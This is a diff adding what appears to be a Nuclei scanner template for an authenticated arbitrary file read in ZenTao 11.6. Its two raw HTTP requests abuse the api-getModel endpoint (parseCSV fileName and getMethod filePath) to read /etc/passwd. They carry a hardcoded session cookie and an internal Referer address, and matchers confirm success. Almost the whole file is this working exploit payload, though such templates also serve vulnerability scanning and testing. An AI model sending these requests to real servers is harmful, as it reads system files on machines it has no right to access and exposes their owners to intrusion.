@@ -1,0 +1,45 @@
+id: zentaocms-ReadFile
+info:
+  name: zentaocms-ReadFile
+  author: apple
+  severity: medium
+  description: 禅道 11.6 api-getModel-api-getMethod-filePath 版本中对用户接口调用权限过滤不完善，导致调用接口导致任意文件读取漏洞。此漏洞需要登录。
+  reference:
+    - https://zhuanlan.zhihu.com/p/621635874
+  tags: zentaocms
+http:
+  - raw:
+      - |+
+        GET /api-getModel-file-parseCSV-fileName=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Referer: http://192.168.100.152:8084/
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: zentaosid=fvom4rntrf5fkfddcb764dng9l; lang=zh-cn; device=desktop; theme=default; windowWidth=1200; windowHeight=1002
+        Connection: close
+
+      - |+
+        GET /api-getModel-api-getMethod-filePath=/etc/passwd/1 HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Referer: http://192.168.100.152:8084/
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: zentaosid=fvom4rntrf5fkfddcb764dng9l; lang=zh-cn; device=desktop; theme=default; windowWidth=1200; windowHeight=1002
+        Connection: close
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"status":"success"'
+      - type: word
+        part: body
+        words:
+          - model.php
